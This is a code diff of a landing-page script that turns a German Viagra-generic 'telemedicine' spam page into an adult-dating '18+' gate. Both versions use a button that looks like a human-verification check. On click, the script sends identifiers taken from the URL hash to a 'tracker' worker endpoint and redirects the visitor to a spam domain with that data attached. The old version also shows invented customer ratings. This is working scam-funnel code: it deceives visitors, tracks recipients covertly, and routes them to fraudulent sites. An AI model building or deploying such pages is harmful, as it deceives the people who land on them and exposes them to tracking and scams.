@@ -1,53 +1,17 @@
-// script.js
-// ========== KONFIGURATION ==========
+// ========== CONFIGURATION ==========
 const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
-const DEFAULT_REDIRECT_URL = 'https://www.rezeptfuchs.com/';
+const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug';
 
-// ========== 10 SLOGANS (basierend auf den gegebenen Inhalten) ==========
-const SLOGANS = [
-    {
-        main: "Premium Telemedizin. Präzise. Diskret. Männlich.",
-        sub: "Ihr digitaler Gesundheitscheck · Ärztlich geprüft"
-    },
-    {
-        main: "Ihr Wunschpräparat in 3 Schritten",
-        sub: "Online-Check → Sofort-Auswertung → E-Rezept & Versand"
-    },
-    {
-        main: "Diskret. Schnell. Sicher.",
-        sub: "Nähe wieder unbeschwert erleben."
-    },
-    {
-        main: "100% diskret & kostenloser Versand",
-        sub: "Neutrale Premium-Verpackung · Keine versteckten Kosten"
-    },
-    {
-        main: "EU-zertifiziert · Fachärztlich geprüft",
-        sub: "Höchste Standards für Ihre Sicherheit"
-    },
-    {
-        main: "Viagra® & Generika – exakt gleicher Wirkstoff",
-        sub: "Deutlich günstiger, identische Qualität"
-    },
-    {
-        main: "Sofort-Auswertung in Sekunden",
-        sub: "Smarte Bestätigung & sicherer Checkout"
-    },
-    {
-        main: "Ihr Weg zur Lösung – schnell & ärztlich geprüft",
-        sub: "Kein Wartezimmer · Rezept in nur 2 Minuten"
-    },
-    {
-        main: "Transparente Preise · Rezept 19,99 €",
-        sub: "Gratis Versand · Strenger EU-Datenschutz"
-    },
-    {
-        main: "Die clevere Alternative: Generika ab 1,74 €/Tablette",
-        sub: "Wunschpräparat wählen – diskret nach Hause"
-    }
+// ========== AVATAR LIST (Rotated randomly on load) ==========
+// Replace these with your public GitHub CDN URLs (e.g., via jsDelivr)
+const AVATAR_LIST = [
+    'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/1.webp',
+    'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/2.webp',
+    'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/3.webp',
+    
 ];
 
-// Fragment-Daten aus URL-Hash auslesen (#in=... oder #usr=...)
+// Extract fragment data from URL hash (#in=... or #usr=...)
 function getFragmentData() {
     const hash = window.location.hash.substring(1);
     if (!hash) return '';
@@ -61,7 +25,7 @@ function getFragmentData() {
     return hash;
 }
 
-// Anfrage an Cloudflare Worker senden und umleiten (nur nach echtem User-Klick)
+// Send data to Cloudflare Worker and redirect (only after real user click)
 async function sendToCloudflareAndRedirect(userData) {
     try {
         const response = await fetch(WORKER_URL, {
@@ -78,76 +42,60 @@ async function sendToCloudflareAndRedirect(userData) {
         const result = await response.json();
         window.location.href = result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
     } catch (error) {
-        // Fallback bei Fehler
+        // Fallback on error
         window.location.href = `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
     }
 }
 
-// Zufälligen Slogan auswählen und in der Oberfläche anzeigen
-function displayRandomSlogan() {
-    const randomIndex = Math.floor(Math.random() * SLOGANS.length);
-    const slogan = SLOGANS[randomIndex];
-    
-    const sloganContainer = document.querySelector('.slogan-container');
-    if (sloganContainer) {
-        sloganContainer.innerHTML = `
-            <div class="slogan-text">${slogan.main}</div>
-            <div class="slogan-sub">
-                <span class="stars">★★★★★</span>
-                <span class="rating-badge">4.8 (1256 verifizierte Kunden)</span>
-            </div>
-            <div class="slogan-sub" style="margin-top: 6px; font-size: 0.75rem; color: #5a6e5a;">
-                ${slogan.sub}
-            </div>
-        `;
-    }
+// Select a random avatar from the configuration array
+function getRandomAvatarUrl() {
+    if (!AVATAR_LIST || AVATAR_LIST.length === 0) return '';
+    const randomIndex = Math.floor(Math.random() * AVATAR_LIST.length);
+    return AVATAR_LIST[randomIndex];
 }
 
-// Hauptinitialisierung: UI aufbauen + Shadow-DOM Button erstellen
+// Main initialization: Build UI + create Shadow DOM button
 function init() {
     const app = document.getElementById('app');
     if (!app) return;
     
     const fragmentData = getFragmentData();
     
-    // 1. HTML-Grundgerüst erstellen (Karte mit Slogan etc.)
+    // 1. Create basic HTML framework (Card with headline, image placeholder, and footer)
     const cardHtml = `
         <div class="verification-card">
-            <div class="slogan-container">
-                <div class="slogan-text">Premium Telemedizin</div>
-                <div class="slogan-sub">
-                    <span class="stars">★★★★★</span>
-                    <span class="rating-badge">4.8 (1256 verifizierte Kunden)</span>
-                </div>
-                <div class="slogan-sub" style="margin-top: 6px; font-size: 0.75rem; color: #5a6e5a;">
-                    Ihr digitaler Gesundheitscheck
-                </div>
-            </div>
-            
             <div class="brand-headline">
-                <h2>Men's Health · Diskret</h2>
-                <p>⚕️ Ärztlich geprüft | Rezept 19,99€ | Gratis Versand</p>
+                <h2>Access Restricted to 18+ Only!</h2>
+                <p>This website contains adult content. Please confirm your age to view and connect with profiles near you.</p>
             </div>
             
             <div id="button-mount"></div>
             
             <div class="footer-note">
-                <span>✓ EU-zertifiziert</span>
-                <span>✓ 100% diskret</span>
-                <span>✓ Sofort-Auswertung</span>
+                <span>✓ Over 18 Years Old</span>
+                <span>✓ 100% Discreet</span>
+                <span>✓ Real Profiles</span>
             </div>
         </div>
     `;
     
     app.innerHTML = cardHtml;
     
-    // Zufälligen Slogan anzeigen
-    displayRandomSlogan();
-    
-    // 2. Shadow DOM mit auffälligem blauen Button
+    // 2. Inject a random photo element dynamically ABOVE the button mount point
     const mountPoint = document.getElementById('button-mount');
     if (!mountPoint) return;
     
+    const chosenAvatar = getRandomAvatarUrl();
+    const avatarContainer = document.createElement('div');
+    avatarContainer.className = 'avatar-container';
+    avatarContainer.innerHTML = `
+        <div class="avatar-wrapper">
+            <img class="avatar-img" src="${chosenAvatar}" alt="Verified Profile">
+        </div>
+    `;
+    mountPoint.parentNode.insertBefore(avatarContainer, mountPoint);
+    
+    // 3. Create Shadow DOM with elegant dark button
     const shadowHost = document.createElement('div');
     shadowHost.style.display = 'flex';
     shadowHost.style.alignItems = 'center';
@@ -156,7 +104,7 @@ function init() {
     
     const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
     
-    // Auffälliger blauer Button mit abgerundeten Ecken (Shadow DOM CSS)
+    // Minimalist, modern dark button styles (Shadow DOM CSS)
     const style = document.createElement('style');
     style.textContent = `
         .cf-button {
@@ -164,59 +112,50 @@ function init() {
             align-items: center;
             justify-content: center;
             gap: 14px;
-            background: linear-gradient(135deg, #1e5af7 0%, #1a4fdb 100%);
+            background: #0f172a;
             border: none;
             border-radius: 60px;
-            padding: 16px 36px;
+            padding: 16px 40px;
             font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-            font-size: 1.1rem;
+            font-size: 1.05rem;
             font-weight: 700;
             color: white;
             cursor: pointer;
-            transition: all 0.25s ease;
-            box-shadow: 0 10px 25px -5px rgba(30, 90, 247, 0.4), 0 4px 8px rgba(0, 0, 0, 0.05);
-            letter-spacing: -0.2px;
+            transition: all 0.2s ease;
+            box-shadow: 0 10px 25px -5px rgba(15, 23, 42, 0.3), 0 4px 8px rgba(0, 0, 0, 0.04);
+            letter-spacing: -0.1px;
             width: auto;
-            min-width: 280px;
+            min-width: 320px;
         }
         .cf-button:hover {
-            background: linear-gradient(135deg, #2a66ff 0%, #1e55e6 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 18px 30px -8px rgba(30, 90, 247, 0.5);
+            background: #1e293b;
+            transform: translateY(-1px);
+            box-shadow: 0 14px 30px -8px rgba(15, 23, 42, 0.4);
         }
         .cf-button:active {
             transform: translateY(1px);
-            box-shadow: 0 8px 18px -5px rgba(30, 90, 247, 0.4);
+            box-shadow: 0 6px 14px -5px rgba(15, 23, 42, 0.3);
         }
         .cf-icon {
-            font-size: 1.5rem;
-            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.1));
+            font-size: 1.25rem;
+            display: inline-flex;
+            align-items: center;
         }
         .cf-checkbox {
-            width: 22px;
-            height: 22px;
-            background: rgba(255,255,255,0.25);
-            border: 2px solid rgba(255,255,255,0.8);
+            width: 20px;
+            height: 20px;
+            background: rgba(255,255,255,0.15);
+            border: 2px solid rgba(255,255,255,0.6);
             border-radius: 30px;
             display: inline-flex;
             align-items: center;
             justify-content: center;
             transition: 0.15s;
         }
-        .cf-checkbox.checked {
-            background: #ffffff;
-            border-color: #ffffff;
-        }
-        .cf-checkbox.checked::after {
-            content: "✓";
-            color: #1e5af7;
-            font-size: 14px;
-            font-weight: 900;
-        }
         .cf-spinner {
-            width: 22px;
-            height: 22px;
-            border: 2px solid rgba(255,255,255,0.4);
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
             border-top-color: white;
             border-radius: 50%;
             animation: spin 0.65s linear infinite;
@@ -225,23 +164,22 @@ function init() {
             to { transform: rotate(360deg); }
         }
         .cf-text {
-            font-weight: 700;
-            letter-spacing: -0.2px;
+            font-weight: 600;
         }
-        /* Verifizierungs-Text im Loading-State */
         .cf-button.loading {
             opacity: 0.9;
             cursor: wait;
         }
     `;
     
-    // Button mit deutschem, auffälligem Text
     const button = document.createElement('div');
     button.className = 'cf-button';
     button.innerHTML = `
-        <span class="cf-icon">🛡️</span>
+        <span class="cf-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        </span>
         <div class="cf-checkbox"></div>
-        <span class="cf-text">Jetzt verifizieren · Mensch bestätigen</span>
+        <span class="cf-text">I am 18+ · Confirm</span>
     `;
     
     shadowRoot.appendChild(style);
@@ -249,34 +187,30 @@ function init() {
     
     let clicked = false;
     
-    // Event-Listener für echten User-Klick
+    // Event listener for user interaction
     button.addEventListener('click', async function() {
         if (clicked) return;
         clicked = true;
         
-        // UI auf "wird verifiziert" umstellen (Loading-State)
         const iconSpan = button.querySelector('.cf-icon');
         const checkboxDiv = button.querySelector('.cf-checkbox');
         const textSpan = button.querySelector('.cf-text');
         
-        if (iconSpan) iconSpan.style.opacity = '0.7';
+        if (iconSpan) iconSpan.style.opacity = '0.5';
         if (checkboxDiv) {
             checkboxDiv.classList.remove('cf-checkbox');
             checkboxDiv.classList.add('cf-spinner');
         }
-        if (textSpan) textSpan.textContent = 'Verifizierung läuft ...';
+        if (textSpan) textSpan.textContent = 'Verification in progress...';
         
         button.style.cursor = 'not-allowed';
         button.style.opacity = '0.9';
         button.style.transform = 'none';
         
-        // Fragment-Daten auslesen
         const userData = getFragmentData();
-        
-        // Daten NACH echtem Klick senden + Weiterleitung
         await sendToCloudflareAndRedirect(userData);
     });
 }
 
-// Starte die Anwendung, sobald DOM bereit ist
+// Start application when DOM is ready
 document.addEventListener('DOMContentLoaded', init);
